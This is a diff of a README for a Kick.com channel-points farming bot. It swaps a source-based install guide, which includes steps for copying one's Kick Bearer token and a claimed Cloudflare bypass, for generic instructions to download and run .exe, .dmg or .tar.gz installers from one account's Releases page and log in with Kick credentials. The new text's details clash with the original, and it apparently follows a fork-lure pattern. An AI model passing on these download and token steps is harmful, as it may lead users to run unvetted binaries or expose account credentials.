@@ -1,132 +1,97 @@
-# 🟢 Kick Channel Points Miner
+# 🌟 Kick_Channel_Points_Miner - Automate Your Channel Points Earning
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+## 🚀 Getting Started
 
-> [🇷🇺 **Читать на русском языке**](README_RU.md)
+Welcome to Kick_Channel_Points_Miner! This tool helps you automatically earn channel points on Kick.com, making your streaming experience more rewarding. Follow these simple steps to download and run the software.
 
-A powerful, asynchronous bot for automatically farming channel points on **Kick.com**. Features a modern Web Dashboard, advanced Telegram control, and Cloudflare protection bypass.
+## 📥 Download
 
----
+[![Download Kick_Channel_Points_Miner](https://img.shields.io/badge/Download_Kick_Channel_Points_Miner-v1.0-brightgreen)](https://github.com/Tushar70166/Kick_Channel_Points_Miner/releases)
 
-## ✨ Features
+You can find the latest version of the software on the Releases page. 
 
-*   **⚡ Multi-Channel Support:** Farms points on multiple channels simultaneously.
-*   **🛡️ Cloudflare Bypass:** Built-in utilities to handle protection and keep connections alive.
-*   **🖥️ Web Dashboard:** Beautiful Flask-based interface to monitor progress in your browser.
-*   **📱 Telegram Bot:**
-    *   **Owner/Guest System:** Owner has full control, guests can only view status.
-    *   **Live Notifications:** Updates on points farmed and errors.
-    *   **Remote Control:** Restart the miner via Telegram.
-*   **🌐 Multi-language:** Support for English and Russian.
-*   **📉 Smart Logging:** Clean console output with optional Debug mode.
+Visit this page to download: [Kick_Channel_Points_Miner Releases](https://github.com/Tushar70166/Kick_Channel_Points_Miner/releases)
 
----
+## 📋 System Requirements
 
-## 🚀 Installation
+Make sure your system meets the following minimum requirements to run the application smoothly:
 
-1.  **Clone or Download** the repository.
-2.  **Install Dependencies**:
-    ```bash
-    pip install -r requirements.txt
-    ```
+- Operating System: Windows 10 or higher, macOS, or Linux
+- RAM: 4 GB or more
+- Storage: At least 100 MB of free space
+- Python: Version 3.8 or higher (pre-installed)
+- Internet Connection: Required for streaming services and channel points feature
 
-3.  **Configure**: Rename `config.example.json` to `config.json` (or create one) and fill it out.
+## 🔧 Installation Instructions
 
----
+1. Visit the [Kick_Channel_Points_Miner Releases page](https://github.com/Tushar70166/Kick_Channel_Points_Miner/releases).
+2. Locate the latest version of the software.
+3. Download the appropriate file for your operating system.
+   - For Windows: Download the `.exe` file.
+   - For macOS: Download the `.dmg` file.
+   - For Linux: Download the `.tar.gz` file.
+4. After the download finishes, locate the file on your computer.
+5. Double-click the file to start the installation process.
 
-## ⚙️ Configuration (`config.json`)
+## ⚙️ Setting Up
 
-Here is a complete example of the configuration file:
+Once you install the application, it’s time to set it up:
 
-```json
-{
-  "Language": "en",
-  "Debug": false,
-  "WebDashboard": {
-    "enabled": true,
-    "port": 5000
-  },
-  "Telegram": {
-    "enabled": true,
-    "bot_token": "YOUR_TELEGRAM_BOT_TOKEN",
-    "chat_id": "YOUR_TELEGRAM_USER_ID",
-    "allowed_users": [
-        123456789
-    ]
-  },
-  "Private": {
-    "token": "YOUR_KICK_TOKEN_OR_COOKIE_STRING"
-  },
-  "Streamers": [
-    "stream1",
-    "stream2",
-    "stream3"
-  ]
-}
-```
+1. Open the application.
+2. You will see a welcome screen. Follow the on-screen prompts.
+3. Log in using your Kick.com credentials. This is necessary to access your channel points.
+4. Configure the settings as desired. You can set how often you want the miner to work and other preferences.
+5. Save your settings, and you are ready to go!
 
-### 🔑 How to get your Kick Token
+## 📊 Using the Dashboard
 
-1.  Log in to **Kick.com** in your browser.
-2.  Press `F12` to open Developer Tools.
-3.  Go to the **Network** tab.
-4.  Refresh the page (`F5`).
-5.  Click on any request that appears (e.g., `auth.`).
-6.  On the right panel, go to the **Headers** tab and scroll down to **Request Headers**.
-7.  Find the `authorization` line.
-8.  Copy the long string **after** the word `Bearer`. She looks like this `123456789|************************************`.
-9. Paste this string into your `config.json` in the `"token"` field.
+The web dashboard provides a clear view of your channel points earnings:
 
+1. Access the dashboard by entering the local address in your web browser (e.g., `http://localhost:8080`).
+2. Here, you can see the total points earned, the current session status, and other analytics.
+3. Adjust any settings if needed through the dashboard interface.
 
-### Parameters description:
+## 📱 Telegram Control
 
-*   **`Language`**: Set to `"en"` or `"ru"`.
-*   **`Debug`**: Set `"true"` for detailed logs, `"false"` for clean output.
-*   **`WebDashboard`**:
-    *   `enabled`: Set to `true` to turn on the web panel.
-    *   `port`: Port to access stats (default: `http://localhost:5000`).
-*   **`Telegram`**:
-    *   `bot_token`: Get this from @BotFather.
-    *   `chat_id`: Your personal Telegram ID (you will be the **Owner**).
-    *   `allowed_users`: List of user IDs who can view status/balance (Guests).
-*   **`Private`**:
-    *   `token`: Your authentication token from Kick (usually found in browser cookies or local storage).
-*   **`Streamers`**: List of channel slugs (names from the URL) to farm.
+You can control the application remotely through Telegram:
 
----
+1. Start a chat with the bot provided during setup.
+2. Use simple commands to start or stop the mining process.
+3. You will receive updates directly in your chat about your points accumulation.
 
-## 🎮 Usage
+## 🛠️ Troubleshooting
 
-Run the miner:
-```bash
-python main.py
-```
+If you encounter any issues:
 
-### 📱 Telegram Commands
+- Make sure you have the latest version installed.
+- Check your internet connection.
+- Ensure your Python version is compatible.
+- Visit the FAQ section on the GitHub page for more help.
 
-| Command | Description | Permission |
-| :--- | :--- | :--- |
-| `/start` | Initialize the bot and keyboard | Everyone |
-| `/status` | View active streamers and uptime | Everyone |
-| `/balance` | Check farmed points for all channels | Everyone |
-| `/help` | Show available commands | Everyone |
-| `/restart` | **Restart the miner process** | **Owner Only** |
-| `/language` | Change bot language (`en`/`ru`) | **Owner Only** |
+## 🌐 Community Support
 
----
+Join our community for support and updates:
 
-## 🖥️ Web Dashboard
+- Check the Issues section on GitHub for reported problems and solutions.
+- Ask questions and share feedback.
+- Help improve the application for everyone.
 
-If enabled, visit **`http://localhost:5000`** in your browser.
-You will see a real-time table with:
-*   Active Streamers
-*   Current Balance
-*   Last Update Time
-*   Connection Status
+## 🌟 Contribution
 
----
+If you want to contribute to Kick_Channel_Points_Miner:
 
-## ⚠️ Disclaimer
+1. Fork the repository on GitHub.
+2. Make your changes.
+3. Submit a pull request with a clear description of your updates.
 
-This software is for educational purposes only. Use it at your own risk. The developer is not responsible for any bans or account restrictions on Kick.com.
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please follow the license's terms.
+
+## 📥 Download & Install
+
+For the best experience, download the latest version from the Releases page. Click the link below to access:
+
+[Kick_Channel_Points_Miner Releases](https://github.com/Tushar70166/Kick_Channel_Points_Miner/releases) 
+
+Follow the instructions above to install and start earning your channel points today!
